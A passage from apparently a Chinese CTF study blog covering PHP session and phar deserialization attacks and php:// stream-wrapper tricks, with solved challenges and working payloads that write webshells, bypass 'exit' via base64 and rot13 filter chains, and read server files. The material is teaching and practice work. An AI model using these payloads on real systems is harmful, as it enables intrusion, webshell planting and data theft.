phpinfo();"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>要注意开头有一个<code>|</code>这就是解析的关键，因为根据<code>php</code> handler来解析，<code>|</code>后面的值当作键值来序列化处理，这是就相当于new了一个test类在$_SESSION的全局变量中，可以输出一下</p><pre class=" language-php"><code class="language-php"><span class="token keyword">array</span> <span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token string">'a:1:{s:4:"test";s:48:"'</span> <span class="token operator">=</span><span class="token operator">></span>    <span class="token function">object</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>      <span class="token keyword">public</span> <span class="token string">'a'</span> <span class="token operator">=</span><span class="token operator">></span> string <span class="token string">'&lt;?php phpinfo();'</span> <span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span></code></pre><p>就会执行<code>__destruct</code>成功写入shell</p><p>jarvisoj-web的一道SESSION反序列化</p><p><a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">题目入口</a></p><p>给出了源码</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//A webshell is wait for you</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">OowoO</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mdzz</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mdzz</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'phpinfo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>看到<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code>应该想到session反序列化<br>但是没有session的可控制点，可以利用Chybeta师傅的一个姿势<br>由phpinfo()页面知，session.upload_progress.enabled为On。当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session<br><a href="http://www.91ri.org/15925.html" target="_blank" rel="noopener">可以参考</a></p><p>构建一个同时可以上传文件和post数据的html</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://web.jarvisoj.com:32784/index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>PHP_SESSION_UPLOAD_PROGRESS<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>123<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>然后上传文件，抓包，改掉filename为构造的反序列化<code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;}</code><br>看到flag的文件，然后再次上传，<code>print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code>得到flag</p><h2 id="phar-反序列化漏洞"><a href="#phar-反序列化漏洞" class="headerlink" title="phar 反序列化漏洞"></a>phar 反序列化漏洞</h2><h3 id="php反序列化攻击条件"><a href="#php反序列化攻击条件" class="headerlink" title="php反序列化攻击条件"></a>php反序列化攻击条件</h3><p>传统的反序列化需要两个条件</p><ol><li>必须有 <code>unserailize()</code> 函数</li><li>参数可控</li></ol><p>如果不满足条件就无法利用，但是phar反序列化漏洞拓宽了反序列化的攻击面</p><h3 id="phar反序列化攻击"><a href="#phar反序列化攻击" class="headerlink" title="phar反序列化攻击"></a>phar反序列化攻击</h3><p>原来 phar 文件包在 生成时会以序列化的形式存储用户自定义的 meta-data ，配合 <code>phar://</code> 我们就能在文件系统函数 <code>file_exists() is_dir()</code> 等参数可控的情况下实现自动的反序列化操作，于是我们就能通过构造精心设计的 phar 包在没有 <code>unserailize()</code> 的情况下实现反序列化攻击，从而将 PHP 反序列化漏洞的触发条件大大拓宽了，降低了我们 PHP 反序列化的攻击起点。</p><h3 id="phar文件"><a href="#phar文件" class="headerlink" title="phar文件"></a>phar文件</h3><p>详情参考php手册(<a href="https://secure.php.net/phar" target="_blank" rel="noopener">https://secure.php.net/phar</a>)</p><p>这里摘出创宇提供的四部分结构概要：</p><ol><li><p>a stub<br>识别phar拓展的标识，格式:xxx<?php xxx; __HALT_COMPILER();?>。对应的函数Phar::setStub,可用于构造MINE绕过上传限制</p></li><li><p>a manifest describing the contents<br>被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用的核心部分。对应函数Phar::setMetadata—设置phar归档元数据</p></li><li><p>the file contents<br>被压缩文件的内容。</p></li><li><p>[optional] a signature for verifying Phar integrity (phar file format only)<br>签名，放在文件末尾。对应函数Phar :: stopBuffering —停止缓冲对Phar存档的写入请求，并将更改保存到磁盘</p></li></ol><h3 id="创建一个phar文件"><a href="#创建一个phar文件" class="headerlink" title="创建一个phar文件"></a>创建一个phar文件</h3><p>必须将php.ini中的<code>phar.readonly</code>配置项配置为0或Off</p><pre class=" language-php"><code class="language-php"><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>通过winhex打开可以发现写入成功</p><p><img src="_v_images/20190512202415290_11485.png" alt="phar"></p><p>进一步利用</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF98a&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$wow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span><span class="token variable">$wow</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">haha</span> <span class="token operator">=</span> <span class="token string">'haha'</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$wow</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="_v_images/20190512202832453_15828.png" alt="phar2"><br>同样写入成功</p><h3 id="触发反序列化"><a href="#触发反序列化" class="headerlink" title="触发反序列化"></a>触发反序列化</h3><p>以下函数通过<code>phar://</code>伪协议解析phar文件的时候就会触发反序列化漏洞</p><table><thead><tr><th align="center"></th><th align="center"></th><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td align="center">fileatime</td><td align="center">filectime</td><td align="center">file_exists</td><td align="center">file_get_contents</td></tr><tr><td align="center">file_put_contents</td><td align="center">file</td><td align="center">filegroup</td><td align="center">fopen</td></tr><tr><td align="center">fileinode</td><td align="center">filemtime</td><td align="center">fileowner</td><td align="center">fikeperms</td></tr><tr><td align="center">is_executable</td><td align="center">is_dir</td><td align="center">is_file</td><td align="center">is_link</td></tr><tr><td align="center">is_readable</td><td align="center">is_writable</td><td align="center">is_writeable</td><td align="center">parse_ini_file</td></tr><tr><td align="center">copy</td><td align="center">readfile</td><td align="center">unlink</td><td align="center">stat</td></tr></tbody></table><h3 id="phar反序列化的利用条件"><a href="#phar反序列化的利用条件" class="headerlink" title="phar反序列化的利用条件"></a>phar反序列化的利用条件</h3><ol><li>文件上传点  #phar:// 不支持访问远程 URL</li><li>系统文件函数</li><li>phar:// 伪协议</li></ol><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- 前端上传 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://localhost/test/upload.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hpdoger<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">/*upload.php*/</span><span class="token comment" spellcheck="true">/*返回后缀名函数*/</span><span class="token keyword">function</span> <span class="token function">getExt</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token function">strripos</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*检测MIME类型是否为gif*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'hpdoger'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"image/gif"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Not allowed !"</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$filenameExt</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">getExt</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'hpdoger'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*提取后缀名*/</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$filenameExt</span> <span class="token operator">!=</span> <span class="token string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Not gif !"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'hpdoger'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'hpdoger'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"Successfully！"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//利用页面</span><span class="token variable">$recieve</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'recieve'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*写入文件类操作*/</span><span class="token delimiter">&lt;?php</span><span class="token variable">$recieve</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'recieve'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*写入文件类操作*/</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span><span class="token punctuation">.</span><span class="token string">"\shell.php"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$recieve</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>利用前面给出的方法，创建带GIF文件头的phar文件，上传后访问  <code>http://localhost/test/re.php?recieve=phar://test2.gif/</code>或<code>http://localhost/test/re.php?recieve=phar://test2.gif/text.txt</code>，即可成功写入</p><p>从源码探究原因，由于萌新不太会c所以就不分析了</p><p>参考</p><p><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/?tdsourcetag=s_pcqq_aiomsg#0X05-%E5%88%A9%E7%94%A8-phar-%E6%8B%93%E5%B1%95-PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="noopener">一篇文章带你深入理解PHP反序列化漏洞</a><br><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">知道创宇的phar分析</a><br><a href="https://www.anquanke.com/post/id/159206" target="_blank" rel="noopener">php反序列化</a></p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议总结</title>
      <link href="/2019/07/15/php-wei-xie-yi/"/>
      <url>/2019/07/15/php-wei-xie-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="php伪协议总结"><a href="#php伪协议总结" class="headerlink" title="php伪协议总结"></a>php伪协议总结</h1><h2 id="php-—-访问各个输入-输出流（I-O-streams）"><a href="#php-—-访问各个输入-输出流（I-O-streams）" class="headerlink" title="php:// — 访问各个输入/输出流（I/O streams）"></a>php:// — 访问各个输入/输出流（I/O streams）</h2><p><code>php://input</code>访问输入流,目前只有和<code>file_get_contents</code>结合使用<br>php://input内容，需要开启allow_url_include，并且当enctype=”multipart/form-data”的时候 php://input是无效的</p><p><code>php://filter</code> 为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。<br>例如bugku的一题<br><a href="http://123.206.87.240:8005/post" target="_blank" rel="noopener">传送门</a></p><p>首先发现有个<code>file</code>参数，用php://filter伪协议读取<code>show.php</code>，再读取<code>index.php</code><br>发现<code>index.php</code>的内容,得到flag</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>Bugku<span class="token operator">-</span>ctf<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>file<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">'&lt;a href="./index.php?file=show.php">click me? no&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"../"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string">"tp"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"input"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Oh no!"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//flag:flag{edulcni_elif_lacol_si_siht}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><p>可以看到，如果不用<code>filter</code>去编码php文件，会被直接执行导致无法获得敏感信息。<br><code>filter</code>协议的妙用 出自<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=1#reply-list" target="_blank" rel="noopener">ph师傅的博客</a></p><h3 id="巧用编码与解码"><a href="#巧用编码与解码" class="headerlink" title="巧用编码与解码"></a>巧用编码与解码</h3><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//test.php</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">'&lt;?php exit; ?>'</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>exp <code>txt=aPD9waHAgcGhwaW5mbygpOyA/Pg==&amp;filename=php://filter/write=convert.base64-decode/resource=shell.php</code><br>首先base64是8个一组来解密，<code>&lt;?php exit; ?&gt;</code>中去掉了无法解密的字符后还剩下<code>phpexit</code>，所以拼接上去一个任意字符凑成8个，在这里是<code>a</code><br><code>PD9waHAgcGhwaW5mbygpOyA/Pg==</code>是base64加密的<code>&lt;?php phpinfo(); ?&gt;</code>，通过写入并且解码成功绕过<code>exit;</code>。</p><p>还可以使用字符串过滤器来处理<br>首先string可以使用<code>strip_tags</code>来去除xml标签,然后使用base64解码传入的webshell的base64加密，即可达到绕过<br>exp<code>txt=PD9waHAgcGhwaW5mbygpOyA/Pg==&amp;filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php</code></p><p>当不开启php短标签的时候，还可以使用rot13绕过<br>exp<code>txt=&lt;?cuc cucvasb();?&gt;&amp;filename=php://filter/write=string.rot13/resource=shell.php</code></p><h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a>file:// 协议</h2><p>linux下可以使用</p><pre class=" language-php"><code class="language-php">file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//localhost/etc/fstab</span>或file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///etc/fstab</span></code></pre><p>windows下可以使用</p><pre class=" language-php"><code class="language-php">file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//localhost/c$/WINDOWS/clock.avi</span>file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///c:/WINDOWS/clock.avi</span></code></pre><pre class=" language-php"><code class="language-php">  <span class="token variable">$URL</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$URL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">'目标网址不合法'</span><span class="token punctuation">;</span>  exit<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token variable">$CH</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$URL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYPEER</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$RES</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'CONTENT-TYPE: IMAGE/PNG'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token variable">$RES</span><span class="token punctuation">;</span></code></pre><p>利用curl可以得到<br>exp<code>curl http://localhost/test.php?url=file://127.0.0.1/D:/wamp64/www/flag.php</code></p><h2 id="zip-和phar-协议"><a href="#zip-和phar-协议" class="headerlink" title="zip:// 和phar:// 协议"></a>zip:// 和phar:// 协议</h2><pre class=" language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token 